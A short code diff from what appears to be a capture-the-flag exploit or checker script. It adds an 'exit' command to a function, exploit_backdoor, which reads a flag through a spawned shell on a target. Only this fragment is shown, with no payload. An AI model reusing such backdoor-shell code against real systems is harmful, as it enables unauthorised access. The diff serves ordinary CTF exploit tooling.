@@ -104,6 +104,7 @@ def exploit_backdoor(target, portSpawnShell) :
     r.recvuntil(b"$ ")
     flag = r.recvline().strip().decode().replace("}.", "}")
     print(flag)
+    r.sendline(b"exit")
     r.close()
     
     if FLAG_FORMAT not in flag:
